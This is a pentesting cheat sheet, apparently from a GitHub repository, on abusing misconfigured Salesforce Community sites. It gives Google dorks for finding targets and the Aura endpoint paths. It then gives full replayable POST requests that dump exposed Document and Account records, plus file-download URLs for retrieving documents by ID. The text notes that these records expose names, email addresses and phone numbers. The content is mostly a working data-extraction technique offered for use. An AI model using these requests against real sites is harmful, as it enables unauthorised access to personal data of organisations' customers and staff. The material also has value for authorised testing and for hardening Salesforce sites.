# Salesforce-Misconfigured-Objects

Permissions are set for objects, fields and records separately. Out of the three, we as pen-testers really care about the record permissions because they are the real data.

#### Google Dork
```
inurl:/s/topic 
inurl:/s/article
inurl:/s/contactsupport
```

#### Aura Paths
The applicaiton needs to use Salesforce programming technologies like Aura components for it to be vulnerable to "Improper Authorization". If one of the HTTP POST requests are visiable, then  there is a possibility for an Improper Authorisation vulnerability.
```
/s/sfsites/aura  
/aura  
/sfsites/aura
```

Aura can be identified using the Google Dorks above or with this Nuclei template which checks for the Aura HTTP Paths above: https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/salesforce-aura.yaml

---

## 1) Exposed `Document` Object
![image](https://user-images.githubusercontent.com/25315255/206927978-016973aa-72db-44af-92bb-327f0c913547.png)

#### Request
This is the request being made when the exposed `Document` object is detected. Open Burp and make the same request but change the value {{hostname}}. 
```
POST /s/sfsites/aura HTTP/2
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

message=%7b%22actions%22%3a%5b%7b%22id%22%3a%22123%3ba%22%2c%22descriptor%22%3a%22serviceComponent%3a%2f%2fui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController%2fACTION%24getItems%22%2c%22callingDescriptor%22%3a%22UNKNOWN%22%2c%22params%22%3a%7b%22entityNameOrId%22%3a%22Document%22%2c%22layoutType%22%3a%22FULL%22%2c%22pageSize%22%3a100%2c%22currentPage%22%3a0%2c%22useTimeout%22%3afalse%2c%22getCount%22%3afalse%2c%22enableRowActions%22%3afalse%7d%7d%5d%7d&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22tr2UlkrAHzi37ijzEeD2UA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22K0V8802f_xC9u_ipYQN2Rg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.token=null
```

#### Response
The response will contain a list of `records`. These records will have `Id`'s that can be put into any of the following URLs to potentially expose sensitive information:
```
/servlet/servlet.FileDownload?file=ID
/sfc/servlet.shepherd/document/download/ID
/sfc/servlet.shepherd/version/download/ID
```
![image](https://user-images.githubusercontent.com/25315255/206928377-9e8336eb-d85b-4529-af0f-3e61f7dc327c.png)

*Example*
```
https://example.com/servlet/servlet.FileDownload?file=0152E000002svDVQAY
```

## 2) Exposed `Account` Object
![image](https://user-images.githubusercontent.com/25315255/206928644-14837312-d184-48a0-b9a0-d3171d4af49d.png)

#### Request
This is the request being made when the exposed `Document` object is detected. Open Burp and make the same request but change the value {{hostname}}. 
```
POST /s/sfsites/aura HTTP/2
Host: {{hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

message=%7b%22actions%22%3a%5b%7b%22id%22%3a%22123%3ba%22%2c%22descriptor%22%3a%22serviceComponent%3a%2f%2fui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController%2fACTION%24getItems%22%2c%22callingDescriptor%22%3a%22UNKNOWN%22%2c%22params%22%3a%7b%22entityNameOrId%22%3a%22Account%22%2c%22layoutType%22%3a%22FULL%22%2c%22pageSize%22%3a100%2c%22currentPage%22%3a0%2c%22useTimeout%22%3afalse%2c%22getCount%22%3afalse%2c%22enableRowActions%22%3afalse%7d%7d%5d%7d&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22tr2UlkrAHzi37ijzEeD2UA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22K0V8802f_xC9u_ipYQN2Rg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.token=null
```

#### Response
The response will contain a list of `records`. These records can expose names, email addresses, phone numbers, and more. 
![image](https://user-images.githubusercontent.com/25315255/206928857-f2d50153-86f1-429c-8e69-2a839a64d882.png)

*Note*
I'm not sure if the email's exposed are customer emails or employee emails. If someone knows, please let me know.
![image](https://user-images.githubusercontent.com/25315255/206928916-523c1e36-15f0-4f7a-a5e5-ac992648d97f.png)

